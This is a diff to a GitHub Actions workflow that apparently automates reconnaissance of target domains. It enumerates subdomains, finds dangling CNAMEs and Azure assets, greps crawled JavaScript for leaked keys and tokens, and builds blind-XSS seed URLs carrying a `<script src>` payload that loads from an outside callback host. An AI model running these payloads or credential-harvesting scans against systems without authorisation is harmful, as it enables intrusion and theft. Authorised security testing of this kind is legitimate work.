@@ -17,7 +17,7 @@ jobs:
       - name: Setup Go
         uses: actions/setup-go@v5
         with:
-          go-version: '1.23'
+          go-version: '1.22.x'
 
       - name: Install Tooling
         run: |
@@ -25,7 +25,7 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y wget unzip jq git curl dnsutils python3 python3-pip python3-venv
 
-          export PATH=$PATH:~/go/bin
+          echo "$HOME/go/bin" >> $GITHUB_PATH
 
           # Go tools
           go install github.com/tomnomnom/assetfinder@latest
@@ -47,10 +47,12 @@ jobs:
           BXHR: ${{ secrets.BXHR }}
         run: |
           set -euo pipefail
+          : "${DOMAINS:?❌ DOMAINS secret not set}"
+
           mkdir -p results
 
           echo "$DOMAINS" | tr -d '\r' | tr ',;' '\n' \
-            | sed 's#https\?://##g' | cut -d'/' -f1 | sed '/^$/d' \
+            | sed -E 's#https?://##gi' | cut -d'/' -f1 | sed '/^$/d' \
             | sort -u > /tmp/domains.txt
 
           echo "[*] Domains:"; cat /tmp/domains.txt
@@ -73,17 +75,19 @@ jobs:
             # Live check
             dnsx -silent -a -resp -l "results/$TARGET/subs_scoped.txt" > "results/$TARGET/live.txt" || true
 
-            # Dangling CNAME check
+            # Dangling CNAME check (NXDOMAIN aware)
             : > "results/$TARGET/dangling-cname.txt"
             while IFS= read -r sub; do
               cname=$(dig +short CNAME "$sub" | sed 's/\.$//' | head -n1)
-              if [ -n "$cname" ] && ! dig +short "$cname" | grep -q .; then
-                echo "$sub -> $cname [🔥 Dangling]" >> "results/$TARGET/dangling-cname.txt"
+              if [ -n "$cname" ]; then
+                if ! dig +short "$cname" | grep -q .; then
+                  echo "$sub -> $cname [🔥 Dangling]" >> "results/$TARGET/dangling-cname.txt"
+                fi
               fi
             done < "results/$TARGET/subs_scoped.txt"
 
-            # Azure asset detection
-            grep -Eio "([a-z0-9.-]+)\.(azurewebsites\.net|azure-api\.net|trafficmanager\.net|blob\.core\.windows\.net|file\.core\.windows\.net|database\.windows\.net)" \
+            # Azure asset detection (case-insensitive)
+            grep -Eio "(?i)([a-z0-9.-]+)\.(azurewebsites\.net|azure-api\.net|trafficmanager\.net|blob\.core\.windows\.net|file\.core\.windows\.net|database\.windows\.net)" \
               "results/$TARGET/live.txt" | sort -u > "results/$TARGET/azure_assets.txt" || true
 
             if [ -s "results/$TARGET/azure_assets.txt" ]; then
@@ -101,6 +105,7 @@ jobs:
 
             # JS crawling + key leaks
             if [ -s "results/$TARGET/live.txt" ]; then
+              mkdir -p "results/$TARGET/spider"
               gospider -S "results/$TARGET/live.txt" --js -o "results/$TARGET/spider" || true
               grep -RIE "(AZURE|STORAGE|SAS|SharedAccessSignature|AccountKey|DefaultEndpointsProtocol|AccountName|BlobEndpoint|QueueEndpoint|FileEndpoint|TableEndpoint|InstrumentationKey|SubscriptionKey|x-azure|Bearer\s+[A-Za-z0-9\-_.=]+)" \
                 "results/$TARGET/spider" > "results/$TARGET/key_leaks.txt" || true
@@ -110,7 +115,7 @@ jobs:
             if [ -n "${BXHR:-}" ] && [ -s "results/$TARGET/live.txt" ]; then
               : > "results/$TARGET/blind_seeds.txt"
               while IFS= read -r base; do
-                enc=$(python3 -c "import urllib.parse as u; print(u.quote('<script src=\"${BXHR}\"></script>'))")
+                enc=$(python3 -c "import urllib.parse as u; print(u.quote(f'<script src=\"{u.quote_plus(\"${BXHR}\")}\"></script>'))")
                 echo "$base?x=${enc}" >> "results/$TARGET/blind_seeds.txt"
               done < "results/$TARGET/live.txt"
             fi
@@ -132,9 +137,13 @@ jobs:
           git add results/ || true
           git commit -m "scans+chains: $(date -u)" --no-verify || echo "No changes"
           git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
-          git push origin HEAD:master || true
+          git push origin HEAD:${GITHUB_REF##*/} || true
 
-          # Telegram alert
+          STATUS="✅ Success"
+          if [ "${{ job.status }}" != "success" ]; then
+            STATUS="❌ Failed"
+          fi
+
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
-            -d text="✅ Azure Recon scan for ${{ github.repository }} completed."
+            -d text="${STATUS} - Azure Recon scan for ${{ github.repository }} completed."
